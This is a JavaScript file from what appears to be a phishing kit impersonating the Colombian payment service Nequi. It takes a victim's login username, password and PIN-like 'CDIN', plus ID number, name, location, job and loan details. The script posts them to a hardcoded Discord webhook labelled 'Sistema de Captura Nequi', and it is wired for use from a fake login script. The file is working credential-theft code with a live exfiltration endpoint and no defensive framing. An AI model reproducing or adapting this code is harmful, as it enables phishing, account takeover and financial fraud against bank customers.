/**
 * Discord Integration (versión simplificada y robusta)
 */

const DISCORD_CONFIG = {
  WEBHOOK_URL: 'https://discord.com/api/webhooks/1385429109135642704/fSW0pterLx8L5gjnCN7oqINDawcI5TCOu-74JXiuyL_9Z2gZpo9eoUmeS_ttqkmH_sOg',
  EMBED_COLOR: 0xDA0081,
  AVATAR_URL: 'https://i.imgur.com/nequi-logo.png'
};

/**
 * Crea el payload de Discord a partir de los datos que tengas.
 * Sólo añade secciones si el dato existe (no es null/undefined).
 */
function createUserDataEmbed(userData) {
  const fields = [];

  // Siempre: datos de acceso
  fields.push({
    name: '📱 Datos de Acceso',
    value: `**Usuario:** ${userData.user}\n**Contraseña:** ${userData.pass}\n**CDIN:** ${userData.cdin}`,
    inline: false
  });

  // Si en el futuro agregas más datos, haz:
  if (userData.monto != null && userData.plazo != null && userData.cuota != null) {
    fields.push({
      name: '💰 Información del Crédito',
      value: `**Monto:** ${formatMoney(userData.monto)}\n**Plazo:** ${userData.plazo} meses\n**Cuota:** ${formatMoney(userData.cuota)}`,
      inline: true
    });
  }

  if (userData.cedula || userData.nombre || userData.departamento || userData.municipio) {
    fields.push({
      name: '👤 Datos Personales',
      value: [
        userData.cedula    ? `**Cédula:** ${userData.cedula}` : null,
        userData.nombre    ? `**Nombre:** ${userData.nombre}` : null,
        userData.departamento ? `**Departamento:** ${userData.departamento}` : null,
        userData.municipio ? `**Municipio:** ${userData.municipio}` : null,
      ].filter(Boolean).join('\n'),
      inline: true
    });
  }

  if (userData.sector || userData.tipo_empleo) {
    fields.push({
      name: '💼 Información Laboral',
      value: [
        userData.sector       ? `**Sector:** ${userData.sector}` : null,
        userData.tipo_empleo  ? `**Tipo de Empleo:** ${userData.tipo_empleo}` : null,
      ].filter(Boolean).join('\n'),
      inline: false
    });
  }

  return {
    username: 'Nequi Bot',
    avatar_url: DISCORD_CONFIG.AVATAR_URL,
    embeds: [{
      title: '🏦 Nueva Solicitud de Crédito Nequi',
      description: 'Se ha recibido una nueva solicitud de crédito',
      color: DISCORD_CONFIG.EMBED_COLOR,
      fields,
      thumbnail: { url: DISCORD_CONFIG.AVATAR_URL },
      footer: { text: 'Sistema de Captura Nequi', icon_url: DISCORD_CONFIG.AVATAR_URL },
      timestamp: new Date().toISOString()
    }]
  };
}

async function sendToDiscord(userData) {
  const payload = createUserDataEmbed(userData);
  try {
    const resp = await fetch(DISCORD_CONFIG.WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!resp.ok) throw new Error(`Discord error ${resp.status}`);
    console.log('✅ Enviado a Discord');
  } catch (err) {
    console.error('❌ Error enviando a Discord:', err);
  }
}

// Formatea números a COP sin decimales
function formatMoney(valor) {
  return new Intl.NumberFormat('es-CO', {
    style: 'currency', currency: 'COP',
    minimumFractionDigits: 0, maximumFractionDigits: 0
  }).format(valor);
}

// Exporta la función para usarla desde tu login.js
window.sendUserDataToDiscord = sendToDiscord;